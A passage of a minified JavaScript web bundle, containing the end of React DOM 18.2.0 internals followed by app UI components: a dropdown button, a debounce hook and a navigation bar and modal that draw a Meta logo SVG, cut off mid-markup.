                              if (a.context === r) {
                                  if (o.tag === 1) {
                                      a = qe(-1, n & -n), a.tag = 2;
                                      var d = o.updateQueue;
                                      if (d !== null) {
                                          d = d.shared;
                                          var v = d.pending;
                                          v === null ? a.next = a : (a.next = v.next, v.next = a), d.pending = a
                                      }
                                  }
                                  o.lanes |= n, a = o.alternate, a !== null && (a.lanes |= n), Po(o.return, n, t), u.lanes |= n;
                                  break
                              }
                              a = a.next
                          }
                      } else if (o.tag === 10) i = o.type === t.type ? null : o.child;
                      else if (o.tag === 18) {
                          if (i = o.return, i === null) throw Error(g(341));
                          i.lanes |= n, u = i.alternate, u !== null && (u.lanes |= n), Po(i, n, t), i = o.sibling
                      } else i = o.child;
                      if (i !== null) i.return = o;
                      else
                          for (i = o; i !== null;) {
                              if (i === t) {
                                  i = null;
                                  break
                              }
                              if (o = i.sibling, o !== null) {
                                  o.return = i.return, i = o;
                                  break
                              }
                              i = i.return
                          }
                      o = i
                  }
          se(e, t, l.children, n),
          t = t.child
      }
      return t;
  case 9:
      return l = t.type, r = t.pendingProps.children, bt(t, n), l = Ne(l), r = r(l), t.flags |= 1, se(e, t, r, n), t.child;
  case 14:
      return r = t.type, l = Me(r, t.pendingProps), l = Me(r.type, l), Ds(e, t, r, l, n);
  case 15:
      return Ua(e, t, t.type, t.pendingProps, n);
  case 17:
      return r = t.type, l = t.pendingProps, l = t.elementType === r ? l : Me(r, l), Lr(e, t), t.tag = 1, he(r) ? (e = !0, qr(t)) : e = !1, bt(t, n), va(t, r, l), Mo(t, r, l, n), Ro(null, t, r, !0, e, n);
  case 19:
      return Qa(e, t, n);
  case 22:
      return Ba(e, t, n)
  }
  throw Error(g(156, t.tag))
};

function uc(e, t) {
  return Iu(e, t)
}

function Fd(e, t, n, r) {
  this.tag = e, this.key = n, this.sibling = this.child = this.return = this.stateNode = this.type = this.elementType = null, this.index = 0, this.ref = null, this.pendingProps = t, this.dependencies = this.memoizedState = this.updateQueue = this.memoizedProps = null, this.mode = r, this.subtreeFlags = this.flags = 0, this.deletions = null, this.childLanes = this.lanes = 0, this.alternate = null
}

function Ce(e, t, n, r) {
  return new Fd(e, t, n, r)
}

function Ii(e) {
  return e = e.prototype, !(!e || !e.isReactComponent)
}

function Vd(e) {
  if (typeof e == "function") return Ii(e) ? 1 : 0;
  if (e != null) {
      if (e = e.$$typeof, e === bo) return 11;
      if (e === ei) return 14
  }
  return 2
}

function pt(e, t) {
  var n = e.alternate;
  return n === null ? (n = Ce(e.tag, t, e.key, e.mode), n.elementType = e.elementType, n.type = e.type, n.stateNode = e.stateNode, n.alternate = e, e.alternate = n) : (n.pendingProps = t, n.type = e.type, n.flags = 0, n.subtreeFlags = 0, n.deletions = null), n.flags = e.flags & 14680064, n.childLanes = e.childLanes, n.lanes = e.lanes, n.child = e.child, n.memoizedProps = e.memoizedProps, n.memoizedState = e.memoizedState, n.updateQueue = e.updateQueue, t = e.dependencies, n.dependencies = t === null ? null : {
      lanes: t.lanes,
      firstContext: t.firstContext
  }, n.sibling = e.sibling, n.index = e.index, n.ref = e.ref, n
}

function Ir(e, t, n, r, l, o) {
  var i = 2;
  if (r = e, typeof e == "function") Ii(e) && (i = 1);
  else if (typeof e == "string") i = 5;
  else e: switch (e) {
  case Ht:
      return Et(n.children, l, o, t);
  case Jo:
      i = 8, l |= 8;
      break;
  case bl:
      return e = Ce(12, n, t, l | 2), e.elementType = bl, e.lanes = o, e;
  case eo:
      return e = Ce(13, n, t, l), e.elementType = eo, e.lanes = o, e;
  case to:
      return e = Ce(19, n, t, l), e.elementType = to, e.lanes = o, e;
  case yu:
      return vl(n, l, o, t);
  default:
      if (typeof e == "object" && e !== null) switch (e.$$typeof) {
      case mu:
          i = 10;
          break e;
      case vu:
          i = 9;
          break e;
      case bo:
          i = 11;
          break e;
      case ei:
          i = 14;
          break e;
      case Je:
          i = 16, r = null;
          break e
      }
      throw Error(g(130, e == null ? e : typeof e, ""))
  }
  return t = Ce(i, n, t, l), t.elementType = e, t.type = r, t.lanes = o, t
}

function Et(e, t, n, r) {
  return e = Ce(7, e, r, t), e.lanes = n, e
}

function vl(e, t, n, r) {
  return e = Ce(22, e, r, t), e.elementType = yu, e.lanes = n, e.stateNode = {
      isHidden: !1
  }, e
}

function Gl(e, t, n) {
  return e = Ce(6, e, null, t), e.lanes = n, e
}

function Xl(e, t, n) {
  return t = Ce(4, e.children !== null ? e.children : [], e.key, t), t.lanes = n, t.stateNode = {
      containerInfo: e.containerInfo,
      pendingChildren: null,
      implementation: e.implementation
  }, t
}

function Ud(e, t, n, r, l) {
  this.tag = t, this.containerInfo = e, this.finishedWork = this.pingCache = this.current = this.pendingChildren = null, this.timeoutHandle = -1, this.callbackNode = this.pendingContext = this.context = null, this.callbackPriority = 0, this.eventTimes = Ml(0), this.expirationTimes = Ml(-1), this.entangledLanes = this.finishedLanes = this.mutableReadLanes = this.expiredLanes = this.pingedLanes = this.suspendedLanes = this.pendingLanes = 0, this.entanglements = Ml(0), this.identifierPrefix = r, this.onRecoverableError = l, this.mutableSourceEagerHydrationData = null
}

function Di(e, t, n, r, l, o, i, u, a) {
  return e = new Ud(e, t, n, u, a), t === 1 ? (t = 1, o === !0 && (t |= 8)) : t = 0, o = Ce(3, null, null, t), e.current = o, o.stateNode = e, o.memoizedState = {
      element: r,
      isDehydrated: n,
      cache: null,
      transitions: null,
      pendingSuspenseBoundaries: null
  }, gi(o), e
}

function Bd(e, t, n) {
  var r = 3 < arguments.length && arguments[3] !== void 0 ? arguments[3] : null;
  return {
      $$typeof: Ot,
      key: r == null ? null : "" + r,
      children: e,
      containerInfo: t,
      implementation: n
  }
}

function ac(e) {
  if (!e) return mt;
  e = e._reactInternals;
  e: {
      if (Dt(e) !== e || e.tag !== 1) throw Error(g(170));
      var t = e;do {
          switch (t.tag) {
          case 3:
              t = t.stateNode.context;
              break e;
          case 1:
              if (he(t.type)) {
                  t = t.stateNode.__reactInternalMemoizedMergedChildContext;
                  break e
              }
          }
          t = t.return
      } while (t !== null);
      throw Error(g(171))
  }
  if (e.tag === 1) {
      var n = e.type;
      if (he(n)) return ua(e, n, t)
  }
  return t
}

function cc(e, t, n, r, l, o, i, u, a) {
  return e = Di(n, r, !0, e, l, o, i, u, a), e.context = ac(null), n = e.current, r = ue(), l = ft(n), o = qe(r, l), o.callback = t ?? null, ct(n, o, l), e.current.lanes = l, er(e, l, r), me(e, r), e
}

function yl(e, t, n, r) {
  var l = t.current,
      o = ue(),
      i = ft(l);
  return n = ac(n), t.context === null ? t.context = n : t.pendingContext = n, t = qe(o, i), t.payload = {
      element: e
  }, r = r === void 0 ? null : r, r !== null && (t.callback = r), e = ct(l, t, i), e !== null && (Ie(e, l, i, o), Pr(e, l, i)), i
}

function ll(e) {
  if (e = e.current, !e.child) return null;
  switch (e.child.tag) {
  case 5:
      return e.child.stateNode;
  default:
      return e.child.stateNode
  }
}

function Zs(e, t) {
  if (e = e.memoizedState, e !== null && e.dehydrated !== null) {
      var n = e.retryLane;
      e.retryLane = n !== 0 && n < t ? n : t
  }
}

function Ai(e, t) {
  Zs(e, t), (e = e.alternate) && Zs(e, t)
}

function $d() {
  return null
}
var dc = typeof reportError == "function" ? reportError : function (e) {
  console.error(e)
};

function Oi(e) {
  this._internalRoot = e
}
gl.prototype.render = Oi.prototype.render = function (e) {
  var t = this._internalRoot;
  if (t === null) throw Error(g(409));
  yl(e, t, null, null)
};
gl.prototype.unmount = Oi.prototype.unmount = function () {
  var e = this._internalRoot;
  if (e !== null) {
      this._internalRoot = null;
      var t = e.containerInfo;
      Tt(function () {
          yl(null, e, null, null)
      }), t[Ze] = null
  }
};

function gl(e) {
  this._internalRoot = e
}
gl.prototype.unstable_scheduleHydration = function (e) {
  if (e) {
      var t = Uu();
      e = {
          blockedOn: null,
          target: e,
          priority: t
      };
      for (var n = 0; n < tt.length && t !== 0 && t < tt[n].priority; n++);
      tt.splice(n, 0, e), n === 0 && $u(e)
  }
};

function Hi(e) {
  return !(!e || e.nodeType !== 1 && e.nodeType !== 9 && e.nodeType !== 11)
}

function xl(e) {
  return !(!e || e.nodeType !== 1 && e.nodeType !== 9 && e.nodeType !== 11 && (e.nodeType !== 8 || e.nodeValue !== " react-mount-point-unstable "))
}

function Ks() {}

function Wd(e, t, n, r, l) {
  if (l) {
      if (typeof r == "function") {
          var o = r;
          r = function () {
              var d = ll(i);
              o.call(d)
          }
      }
      var i = cc(t, r, e, 0, null, !1, !1, "", Ks);
      return e._reactRootContainer = i, e[Ze] = i.current, $n(e.nodeType === 8 ? e.parentNode : e), Tt(), i
  }
  for (; l = e.lastChild;) e.removeChild(l);
  if (typeof r == "function") {
      var u = r;
      r = function () {
          var d = ll(a);
          u.call(d)
      }
  }
  var a = Di(e, 0, !1, null, null, !1, !1, "", Ks);
  return e._reactRootContainer = a, e[Ze] = a.current, $n(e.nodeType === 8 ? e.parentNode : e), Tt(function () {
      yl(t, a, n, r)
  }), a
}

function wl(e, t, n, r, l) {
  var o = n._reactRootContainer;
  if (o) {
      var i = o;
      if (typeof l == "function") {
          var u = l;
          l = function () {
              var a = ll(i);
              u.call(a)
          }
      }
      yl(t, i, e, l)
  } else i = Wd(n, t, e, l, r);
  return ll(i)
}
Fu = function (e) {
  switch (e.tag) {
  case 3:
      var t = e.stateNode;
      if (t.current.memoizedState.isDehydrated) {
          var n = Cn(t.pendingLanes);
          n !== 0 && (ri(t, n | 1), me(t, Z()), !(R & 6) && (un = Z() + 500, gt()))
      }
      break;
  case 13:
      Tt(function () {
          var r = Ke(e, 1);
          if (r !== null) {
              var l = ue();
              Ie(r, e, 1, l)
          }
      }), Ai(e, 1)
  }
};
li = function (e) {
  if (e.tag === 13) {
      var t = Ke(e, 134217728);
      if (t !== null) {
          var n = ue();
          Ie(t, e, 134217728, n)
      }
      Ai(e, 134217728)
  }
};
Vu = function (e) {
  if (e.tag === 13) {
      var t = ft(e),
          n = Ke(e, t);
      if (n !== null) {
          var r = ue();
          Ie(n, e, t, r)
      }
      Ai(e, t)
  }
};
Uu = function () {
  return I
};
Bu = function (e, t) {
  var n = I;
  try {
      return I = e, t()
  } finally {
      I = n
  }
};
fo = function (e, t, n) {
  switch (t) {
  case "input":
      if (lo(e, n), t = n.name, n.type === "radio" && t != null) {
          for (n = e; n.parentNode;) n = n.parentNode;
          for (n = n.querySelectorAll("input[name=" + JSON.stringify("" + t) + '][type="radio"]'), t = 0; t < n.length; t++) {
              var r = n[t];
              if (r !== e && r.form === e.form) {
                  var l = cl(r);
                  if (!l) throw Error(g(90));
                  xu(r), lo(r, l)
              }
          }
      }
      break;
  case "textarea":
      ku(e, n);
      break;
  case "select":
      t = n.value, t != null && Gt(e, !!n.multiple, t, !1)
  }
};
Pu = Li;
zu = Tt;
var qd = {
      usingClientEntryPoint: !1,
      Events: [nr, Bt, cl, Nu, Eu, Li]
  },
  kn = {
      findFiberByHostInstance: St,
      bundleType: 0,
      version: "18.2.0",
      rendererPackageName: "react-dom"
  },
  Qd = {
      bundleType: kn.bundleType,
      version: kn.version,
      rendererPackageName: kn.rendererPackageName,
      rendererConfig: kn.rendererConfig,
      overrideHookState: null,
      overrideHookStateDeletePath: null,
      overrideHookStateRenamePath: null,
      overrideProps: null,
      overridePropsDeletePath: null,
      overridePropsRenamePath: null,
      setErrorHandler: null,
      setSuspenseHandler: null,
      scheduleUpdate: null,
      currentDispatcherRef: Xe.ReactCurrentDispatcher,
      findHostInstanceByFiber: function (e) {
          return e = Tu(e), e === null ? null : e.stateNode
      },
      findFiberByHostInstance: kn.findFiberByHostInstance || $d,
      findHostInstancesForRefresh: null,
      scheduleRefresh: null,
      scheduleRoot: null,
      setRefreshHandler: null,
      getCurrentFiber: null,
      reconcilerVersion: "18.2.0-next-9e3b772b8-20220608"
  };
if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ < "u") {
  var jr = __REACT_DEVTOOLS_GLOBAL_HOOK__;
  if (!jr.isDisabled && jr.supportsFiber) try {
      il = jr.inject(Qd), Fe = jr
  } catch {}
}
we.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = qd;
we.createPortal = function (e, t) {
  var n = 2 < arguments.length && arguments[2] !== void 0 ? arguments[2] : null;
  if (!Hi(t)) throw Error(g(200));
  return Bd(e, t, null, n)
};
we.createRoot = function (e, t) {
  if (!Hi(e)) throw Error(g(299));
  var n = !1,
      r = "",
      l = dc;
  return t != null && (t.unstable_strictMode === !0 && (n = !0), t.identifierPrefix !== void 0 && (r = t.identifierPrefix), t.onRecoverableError !== void 0 && (l = t.onRecoverableError)), t = Di(e, 1, !1, null, null, n, !1, r, l), e[Ze] = t.current, $n(e.nodeType === 8 ? e.parentNode : e), new Oi(t)
};
we.findDOMNode = function (e) {
  if (e == null) return null;
  if (e.nodeType === 1) return e;
  var t = e._reactInternals;
  if (t === void 0) throw typeof e.render == "function" ? Error(g(188)) : (e = Object.keys(e).join(","), Error(g(268, e)));
  return e = Tu(t), e = e === null ? null : e.stateNode, e
};
we.flushSync = function (e) {
  return Tt(e)
};
we.hydrate = function (e, t, n) {
  if (!xl(t)) throw Error(g(200));
  return wl(null, e, t, !0, n)
};
we.hydrateRoot = function (e, t, n) {
  if (!Hi(e)) throw Error(g(405));
  var r = n != null && n.hydratedSources || null,
      l = !1,
      o = "",
      i = dc;
  if (n != null && (n.unstable_strictMode === !0 && (l = !0), n.identifierPrefix !== void 0 && (o = n.identifierPrefix), n.onRecoverableError !== void 0 && (i = n.onRecoverableError)), t = cc(t, null, e, 1, n ?? null, l, !1, o, i), e[Ze] = t.current, $n(e), r)
      for (e = 0; e < r.length; e++) n = r[e], l = n._getVersion, l = l(n._source), t.mutableSourceEagerHydrationData == null ? t.mutableSourceEagerHydrationData = [n, l] : t.mutableSourceEagerHydrationData.push(n, l);
  return new gl(t)
};
we.render = function (e, t, n) {
  if (!xl(t)) throw Error(g(200));
  return wl(null, e, t, !1, n)
};
we.unmountComponentAtNode = function (e) {
  if (!xl(e)) throw Error(g(40));
  return e._reactRootContainer ? (Tt(function () {
      wl(null, null, e, !1, function () {
          e._reactRootContainer = null, e[Ze] = null
      })
  }), !0) : !1
};
we.unstable_batchedUpdates = Li;
we.unstable_renderSubtreeIntoContainer = function (e, t, n, r) {
  if (!xl(n)) throw Error(g(200));
  if (e == null || e._reactInternals === void 0) throw Error(g(38));
  return wl(e, t, n, !1, r)
};
we.version = "18.2.0-next-9e3b772b8-20220608";

function fc() {
  if (!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" || typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function")) try {
      __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(fc)
  } catch (e) {
      console.error(e)
  }
}
fc(), cu.exports = we;
var Zd = cu.exports,
  Gs = Zd;
Yl.createRoot = Gs.createRoot, Yl.hydrateRoot = Gs.hydrateRoot;

function O({
  icon: e,
  text: t,
  drop: n = !1,
  style: r,
  children: l,
  dopIcon: o,
  fun: i,
  changeFormShow: u,
  formIndex: a = 1
}) {
  const [d, v] = T.useState(!1), m = () => {
      v(h => !h)
  };
  return s.jsxs("div", {
      className: "uiButton",
      children: [s.jsxs("div", {
          className: `uiButton__toggle ${r}`,
          onClick: () => u ? u(a) : m(),
          children: [s.jsx("div", {
              className: "uiButton__icon",
              children: e
          }), s.jsx("div", {
              className: "uiButton__text",
              children: t
          }), s.jsxs("div", {
              className: `uiButton__icon ${d&&"uiButton__icon--rotate"}`,
              children: [n && s.jsx("svg", {
                  viewBox: "0 0 24 24",
                  fill: "currentColor",
                  width: "1em",
                  height: "1em",
                  "aria-hidden": "true",
                  className: "ARROW",
                  children: s.jsx("path", {
                      fillRule: "evenodd",
                      clipRule: "evenodd",
                      d: "M4.341 7.247a1 1 0 0 1 1.412.095L12 14.482l6.247-7.14a1 1 0 0 1 1.506 1.317l-7 8a1 1 0 0 1-1.506 0l-7-8a1 1 0 0 1 .095-1.412z"
                  })
              }), o && s.jsxs("svg", {
                  viewBox: "0 0 24 24",
                  fill: "currentColor",
                  width: "1em",
                  height: "1em",
                  "aria-hidden": "true",
                  className: "",
                  children: [s.jsx("path", {
                      d: "M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"
                  }), s.jsx("path", {
                      d: "M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"
                  })]
              })]
          })]
      }), n && s.jsx("div", {
          className: `uiButton__drop ${d&&"uiButton__drop--active"}`,
          children: l
      })]
  })
}

function Kd(e, t) {
  const [n, r] = T.useState(e);
  return T.useEffect(() => {
      const l = setTimeout(() => {
          r(e)
      }, t);
      return () => {
          clearTimeout(l)
      }
  }, [e]), n
}

function Gd({
  changeFormShow: e
}) {
  const [t, n] = T.useState(!1), [r, l] = T.useState(!1), o = () => {
      n(w => !w)
  }, i = w => {
      l(k => !k)
  };
  T.useEffect(() => {
      t ? document.body.classList.add("freezeScroll") : document.body.classList.remove("freezeScroll")
  }, [t]), T.useEffect(() => {
      r ? document.body.classList.add("freezeScroll") : document.body.classList.remove("freezeScroll")
  }, [r]);
  const [u, a] = T.useState(""), [d, v] = T.useState(!1), [m, h] = T.useState(!1), x = Kd(u, 500);
  return T.useEffect(() => {
      x ? (h(!0), setTimeout(() => {
          h(!1), v(!0)
      }, 200)) : v(!1)
  }, [x]), s.jsxs("div", {
      className: "navBar",
      children: [s.jsx("div", {
          className: "navBar__logo mb-0 mb-lg-3",
          children: s.jsxs("svg", {
              "aria-label": "Логотип Meta",
              className: "",
              role: "img",
              viewBox: "0 0 500 100",
              children: [s.jsxs("defs", {
                  children: [s.jsxs("linearGradient", {
                      gradientUnits: "userSpaceOnUse",
                      id: ":R1eckmkldd6knpapd5aqH1:",
                      x1: "124.38",
                      x2: "160.838",
                      y1: "99",
                      y2: "59.326",
                      children: [s.jsx("stop", {
                          offset: ".427",
                          stopColor: "#0278F1"
                      }), s.jsx("stop", {
                          offset: ".917",
                          stopColor: "#0180FA"
                      })]
                  }), s.jsxs("linearGradient", {
                      gradientUnits: "userSpaceOnUse",
                      id: ":R1eckmkldd6knpapd5aqH2:",
                      x1: "42",
                      x2: "-1.666",
                      y1: "4.936",
                      y2: "61.707",
                      children: [s.jsx("stop", {
                          offset: ".427",
                          stopColor: "#0165E0"
                      }), s.jsx("stop", {
                          offset: ".917",
                          stopColor: "#0180FA"
                      })]
                  }), s.jsxs("linearGradient", {
                      gradientUnits: "userSpaceOnUse",
                      id: ":R1eckmkldd6knpapd5aqH3:",
                      x1: "27.677",
                      x2: "132.943",
                      y1: "28.71",
                      y2: "71.118",
                      children: [s.jsx("stop", {
                          stopColor: "#0064E0"
                      }), s.jsx("stop", {
                          offset: ".656",
                          stopColor: "#0066E2"
                      }), s.jsx("stop", {
                          offset: "1",
                          stopColor: "#0278F1"
                      })]
                  })]
              }), s.jsx("path", {
                  d: "M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z",
                  fill: "#1C2B33"
              }), s.jsx("path", {
                  d: "M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z",
                  fill: "#0180FA"
              }), s.jsx("path", {
                  d: "M145.631 36h-16.759c3.045 7.956 4.861 17.797 4.861 28.725 0 11.403-4.729 17.547-11.651 17.547H122v16.726l.449.002c16.448 0 27.617-13.723 27.617-33.25 0-10.85-1.6-20.917-4.435-29.75Z",
                  fill: "url(#:R1eckmkldd6knpapd5aqH1:)"
              }), s.jsx("path", {
                  d: "M42 .016C18.63.776.832 28.908.028 63h16.92C17.483 39.716 28.762 18.315 42 17.31V.017Z",
                  fill: "url(#:R1eckmkldd6knpapd5aqH2:)"
              }), s.jsx("path", {
                  d: "m75.195 19.935.007-.009c2.447 3.223 5.264 7.229 9.33 13.62l-.005.005c2.478 3.906 5.09 8.208 7.88 12.945l9.663 16.386c8.978 15.157 13.364 19.39 20.012 19.39.31 0 .617-.012.918-.037v16.76c-.183.003-.367.005-.551.005-14.323 0-22.777-6.281-35.182-27.447L77.604 55.1l-.625-1.065L77 54c-2.386-4.175-7.606-12.685-11.973-19.232l.005-.008-.62-.91C63.153 31.983 61.985 30.313 61 29l-.066.024c-7.006-9.172-11.818-11.75-17.964-11.75-.324 0-.648.012-.97.037V.016c.322-.01.646-.016.97-.016 12.182 0 21.17 5.36 32.225 19.935Z",
                  fill: "url(#:R1eckmkldd6knpapd5aqH3:)"
              })]
          })
      }), s.jsx("div", {
          className: `uiModal ${t&&"uiModal__active"}`,
          children: s.jsxs("div", {
              className: "uiModal__content",
              children: [s.jsx("div", {
                  className: "uiModal__close",
                  onClick: o
              }), s.jsx("div", {
                  className: "navBar__logo d-block d-lg-none",
                  children: s.jsxs("svg", {
                      "aria-label": "Логотип Meta",
                      className: "",
                      role: "img",
                      viewBox: "0 0 500 100",
                      children: [s.jsxs("defs", {
                          children: [s.jsxs("linearGradient", {
                              gradientUnits: "userSpaceOnUse",
                              id: ":R1eckmkldd6knpapd5aqH1:",
                              x1: "124.38",
                              x2: "160.838",
                              y1: "99",
                              y2: "59.326",
                              children: [s.jsx("stop", {
                                  offset: ".427",
                                  stopColor: "#0278F1"
                              }), s.jsx("stop", {
                                  offset: ".917",
                                  stopColor: "#0180FA"
                              })]
                          }), s.jsxs("linearGradient", {
                              gradientUnits: "userSpaceOnUse",
                              id: ":R1eckmkldd6knpapd5aqH2:",
                              x1: "42",
                              x2: "-1.666",
                              y1: "4.936",
                              y2: "61.707",
                              children: [s.jsx("stop", {
                                  offset: ".427",
                                  stopColor: "#0165E0"
                              }), s.jsx("stop", {
                                  offset: ".917",
                                  stopColor: "#0180FA"
                              })]
                          }), s.jsxs("linearGradient", {
                              gradientUnits: "userSpaceOnUse",
                              id: ":R1eckmkldd6knpapd5aqH3:",
                              x1: "27.677",
                              x2: "132.943",
                              y1: "28.71",
                              y2: "71.118",
                              children: [s.jsx("stop", {
                                  stopColor: "#0064E0"
                              }), s.jsx("stop", {
                                  offset: ".656",
                                  stopColor: "#0066E2"
                              }), s.jsx("stop", {
                                  offset: "1",
                                  stopColor: "#0278F1"
                              })]
                          })]
                      }), s.jsx("path", {
                          d: "M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z",
                          fill: "#1C2B33"
                      }), s.jsx("path", {
                          d: "M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z",
                          fill: "#0180FA"
                      }), s.jsx("path", {
                          d: "M145.631 36h-16.759c3.045 7.956 4.861 17.797 4.861 28.725 0 11.403-4.729 17.547-11.651 17.547H122v16.726l.449.002c16.448 0 27.617-13.723 27.617-33.25 0-10.85-1.6-20.917-4.435-29.75Z",
                          fill: "url(#:R1eckmkldd6knpapd5aqH1:)"
                      }), s.jsx("path", {
                          d: "M42 .016C18.63.776.832 28.908.028 63h16.92C17.483 39.716 28.762 18.315 42 17.31V.017Z",
                          fill: "url(#:R1eckmkldd6knpapd5aqH2:)"
